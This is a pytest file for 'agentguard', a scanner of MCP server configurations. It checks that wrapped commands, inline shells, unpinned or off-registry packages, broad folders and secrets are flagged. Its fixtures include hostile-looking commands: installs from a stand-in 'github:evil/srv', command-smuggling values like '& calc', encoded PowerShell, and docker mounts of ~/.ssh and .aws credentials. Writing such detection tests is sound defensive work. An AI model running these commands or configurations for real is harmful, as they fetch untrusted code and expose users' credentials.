"""Tests v0.3.0 (jour 2) : commandes « enveloppées » et angles morts d'AG101 à AG107.

Sous Windows, les guides officiels font souvent lancer un serveur par
`cmd /c npx -y paquet` ; ailleurs on croise `wsl`, `env`, `sudo` ou `bash -c "…"`.
Jusqu'ici, agentguard ne regardait que la première commande : le paquet réellement
lancé n'était jamais vérifié (AG102, AG107…). Décisions du chef de projet du
8 octobre 2026 :
- `cmd /c` qui lance un programme en morceaux séparés, sans caractère spécial :
  pas d'AG101, mais la commande intérieure est analysée ;
- du code écrit directement dans la configuration (`node -e`, `python -c`) : AG101.
"""

import time

import pytest

from agentguard.scanner import scan


def ids_for(write_mcp, command: str, args: list[str]) -> list[str]:
    path = write_mcp({"s": {"command": command, "args": args}})
    return sorted(f.rule.id for f in scan(path).findings)


def ids_for_server(write_mcp, server: dict) -> list[str]:
    return sorted(f.rule.id for f in scan(write_mcp({"s": server})).findings)


# --- Commandes enveloppées : la commande intérieure est analysée ---------------


@pytest.mark.parametrize(
    ("command", "args", "expected"),
    [
        ("cmd", ["/c", "npx", "-y", "pkg@1.2.3"], []),
        ("cmd", ["/c", "npx", "-y", "github:evil/srv"], ["AG107"]),
        ("cmd", ["/c", "npx", "-y", "unpinned-pkg"], ["AG102"]),
        ("C:\\Windows\\System32\\cmd.exe", ["/d", "/s", "/c", "npx", "-y", "pkg"], ["AG102"]),
        ("cmd", ["/C", "uvx", "--from", "git+https://github.com/evil/srv", "srv"], ["AG107"]),
        ("wsl.exe", ["-d", "Ubuntu", "--", "npx", "-y", "github:evil/srv"], ["AG107"]),
        ("wsl", ["npx", "-y", "pkg"], ["AG102"]),
        ("/usr/bin/env", ["FOO=1", "npx", "-y", "pkg"], ["AG102"]),
        ("sudo", ["-u", "root", "docker", "run", "--privileged", "img:1"], ["AG106"]),
        ("timeout", ["30", "npx", "-y", "github:evil/srv"], ["AG107"]),
        ("npx.cmd", ["-y", "pkg"], ["AG102"]),
        ("C:\\Program Files\\nodejs\\npx.CMD", ["-y", "github:evil/srv"], ["AG107"]),
    ],
    ids=[
        "cmd-pinned-ok",
        "cmd-git-source",
        "cmd-unpinned",
        "cmd-exe-options",
        "cmd-uvx",
        "wsl-distribution",
        "wsl-plain",
        "env-assignment",
        "sudo-docker",
        "timeout",
        "npx-cmd",
        "npx-cmd-path",
    ],
)
def test_wrapped_commands_are_analysed(write_mcp, command, args, expected) -> None:
    assert ids_for(write_mcp, command, args) == expected


# --- AG101 : shells et code en ligne ---------------------------------------------


@pytest.mark.parametrize(
    ("command", "args", "expected"),
    [
        ("cmd", ["/c", "npx -y pkg@1.2.3"], ["AG101"]),
        ("cmd", ["/c", "npx", "-y", "pkg@1.2.3", "&", "calc"], ["AG101"]),
        ("cmd", ["/k", "npx", "-y", "pkg@1.2.3", "|", "more"], ["AG101"]),
        ("bash", ["-lc", "echo hi"], ["AG101"]),
        ("bash", ["-o", "pipefail", "-c", "echo hi"], ["AG101"]),
        ("bash", ["-c", "npx -y github:evil/srv"], ["AG101", "AG107"]),
        ("/usr/bin/env", ["sh", "-c", "echo hi"], ["AG101"]),
        ("env", ["-i", "PATH=/usr/bin", "bash", "-c", "x"], ["AG101"]),
        ("wsl.exe", ["bash", "-c", "x"], ["AG101"]),
        ("cmd", ["/c", "wsl", "bash", "-c", "npx -y github:evil/srv"], ["AG101", "AG107"]),
        ("pwsh", ["-e", "ZQBjAGgAbwA="], ["AG101"]),
        ("powershell.exe", ["-NoProfile", "-ec", "ZQBjAGgAbwA="], ["AG101"]),
        ("pwsh", ["-Com", "Get-Date"], ["AG101"]),
        ("node", ["-e", "require('child_process')"], ["AG101"]),
        ("node", ["--eval", "1"], ["AG101"]),
        ("python3", ["-c", "import os"], ["AG101"]),
        ("python3.12", ["-c", "import os"], ["AG101"]),
    ],
    ids=[
        "cmd-single-string",
        "cmd-ampersand",
        "cmd-pipe",
        "bash-lc",
        "bash-option-value",
        "bash-inner-package",
        "env-sh",
        "env-options",
        "wsl-bash",
        "nested",
        "pwsh-encoded",
        "powershell-ec",
        "pwsh-command-prefix",
        "node-e",
        "node-eval",
        "python-c",
        "python-versioned",
    ],
)
def test_shells_and_inline_code_are_flagged(write_mcp, command, args, expected) -> None:
    assert ids_for(write_mcp, command, args) == expected


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("bash", ["./start.sh", "-c", "config.yml"]),
        ("pwsh", ["-File", "server.ps1"]),
        ("python", ["-m", "mcp_server_git"]),
        ("node", ["server.js", "-e", "production"]),
        ("cmd", ["/c", "server.exe", "--port", "8080"]),
    ],
    ids=["bash-script-file", "pwsh-file", "python-module", "node-script", "cmd-plain-exe"],
)
def test_ordinary_launches_are_fine(write_mcp, command, args) -> None:
    assert ids_for(write_mcp, command, args) == []


def test_ag101_message_names_the_shell(write_mcp) -> None:
    path = write_mcp({"s": {"command": "cmd", "args": ["/c", "npx -y pkg@1.2.3"]}})
    message = scan(path).findings[0].message
    assert "cmd" in message


# --- AG102 : versions vraiment figées ------------------------------------------


@pytest.mark.parametrize(
    ("command", "package", "pinned"),
    [
        ("npx", "pkg@^1.0.0", False),
        ("npx", "pkg@~1.2.3", False),
        ("npx", "pkg@1", False),
        ("npx", "pkg@1.x", False),
        ("npx", "pkg@beta", False),
        ("npx", "pkg@>=1.0.0", False),
        ("npx", "@scope/pkg@*", False),
        ("npx", "pkg@1.2.3", True),
        ("npx", "@scope/pkg@1.2.3-rc.1", True),
        ("npx", "pkg@2025.8.21", True),
        ("uvx", "pkg>=1.0", False),
        ("uvx", "pkg~=1.0", False),
        ("uvx", "pkg==1.*", False),
        ("uvx", "pkg@latest", False),
        ("uvx", "pkg>=1,<2", False),
        ("uvx", "pkg==1.2.3", True),
        ("uvx", "pkg@1.2.3", True),
        ("uvx", "pkg[cli]==2.0", True),
    ],
)
def test_only_exact_versions_count_as_pinned(write_mcp, command, package, pinned) -> None:
    expected = [] if pinned else ["AG102"]
    assert ids_for(write_mcp, command, ["-y", package] if command == "npx" else [package]) == (
        expected
    )


# --- AG107 : autres sources hors registre --------------------------------------


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("npx", ["-y", "someone/mcp-server"]),
        ("npx", ["-y", "someone/mcp-server#v1.0.0"]),
        ("npx", ["-y", "git@github.com:someone/mcp-server.git"]),
        ("uvx", ["--from", "srv @ git+https://github.com/someone/srv", "srv"]),
        ("uvx", ["srv @ https://files.example/srv-1.0-py3-none-any.whl"]),
        ("uvx", ["--from", "hg+https://hg.example/srv", "srv"]),
    ],
    ids=[
        "github-shorthand",
        "github-shorthand-ref",
        "scp-like-git",
        "pep508-git",
        "pep508-url",
        "mercurial",
    ],
)
def test_more_untrusted_sources(write_mcp, command, args) -> None:
    assert ids_for(write_mcp, command, args) == ["AG107"]


def test_local_and_scoped_packages_are_not_untrusted_sources(write_mcp) -> None:
    assert ids_for(write_mcp, "npx", ["-y", "@scope/pkg@1.2.3"]) == []


# --- AG104 et AG106 : dossiers personnels --------------------------------------


@pytest.mark.parametrize(
    "folder",
    [
        "/home/alice",
        "/Users/alice/",
        "C:\\Users\\alice",
        "c:\\",
        "D:\\",
        "/root",
        "%USERPROFILE%",
        "${env:USERPROFILE}",
        "$env:USERPROFILE",
    ],
)
def test_home_and_drive_roots_are_broad(write_mcp, folder) -> None:
    args = ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", folder]
    assert ids_for(write_mcp, "npx", args) == ["AG104"]


def test_project_folder_inside_home_is_fine(write_mcp) -> None:
    args = ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "/home/alice/project"]
    assert ids_for(write_mcp, "npx", args) == []


@pytest.mark.parametrize(
    "mount",
    [
        "~/.ssh:/root/.ssh:ro",
        "/home/alice/.aws:/creds",
        "C:\\Users\\alice:/host",
        "/Users/alice/.kube/config:/k",
        "$HOME:/h",
    ],
)
def test_personal_folders_mounted_in_a_container(write_mcp, mount) -> None:
    assert ids_for(write_mcp, "docker", ["run", "-v", mount, "img:1"]) == ["AG106"]


def test_project_mount_is_fine(write_mcp) -> None:
    assert ids_for(write_mcp, "docker", ["run", "-v", "./data:/data", "img:1"]) == []


# --- AG103 : modèles à remplir, références et mots de passe dans une URL --------


@pytest.mark.parametrize(
    "value",
    [
        "<YOUR_API_KEY>",
        "your-api-key-here",
        "YOUR_TOKEN",
        "xxxxxxxx",
        "${{ secrets.API_KEY }}",
        "%API_KEY%",
        "${API_KEY:-}",
        "${API_KEY:-${FALLBACK_KEY}}",
        "$env:API_KEY",
    ],
)
def test_placeholders_and_references_are_not_secrets(write_mcp, value) -> None:
    assert ids_for_server(write_mcp, {"command": "srv", "env": {"API_KEY": value}}) == []


def test_literal_default_value_is_a_secret(write_mcp) -> None:
    server = {"command": "srv", "env": {"API_KEY": "${API_KEY:-literal-default-0123456789}"}}
    findings = scan(write_mcp({"s": server})).findings
    assert [f.rule.id for f in findings] == ["AG103"]
    assert "literal-default-0123456789" not in findings[0].message


def test_password_inside_a_url_is_a_secret(write_mcp) -> None:
    password = "S3cret" + "Passw0rd" + "Value42"
    server = {
        "command": "srv",
        "env": {"DATABASE_URL": f"postgres://app:{password}@db.example/app"},
    }
    findings = scan(write_mcp({"s": server})).findings
    assert [f.rule.id for f in findings] == ["AG103"]
    assert password not in findings[0].message


@pytest.mark.parametrize(
    "url",
    [
        "postgres://app:${DB_PASSWORD}@db.example/app",
        "postgres://db.example/app",
        "https://user@host.example/x",
    ],
)
def test_url_without_literal_password_is_fine(write_mcp, url) -> None:
    assert ids_for_server(write_mcp, {"command": "srv", "env": {"DATABASE_URL": url}}) == []


# --- Entrées piégées ----------------------------------------------------------


def test_endless_wrappers_do_not_loop(write_mcp) -> None:
    start = time.perf_counter()
    assert ids_for(write_mcp, "env", ["env"] * 50_000 + ["bash", "-c", "x"]) == ["AG101"]
    assert time.perf_counter() - start < 5


def test_huge_shell_script_is_fast(write_mcp) -> None:
    start = time.perf_counter()
    script = "npx -y github:evil/srv; " + "echo 'a\"b' " * 60_000
    assert ids_for(write_mcp, "bash", ["-c", script]) == ["AG101", "AG107"]
    assert time.perf_counter() - start < 5


def test_unbalanced_quotes_in_script_do_not_crash(write_mcp) -> None:
    assert ids_for(write_mcp, "sh", ["-c", "npx -y 'github:evil/srv"]) == ["AG101", "AG107"]
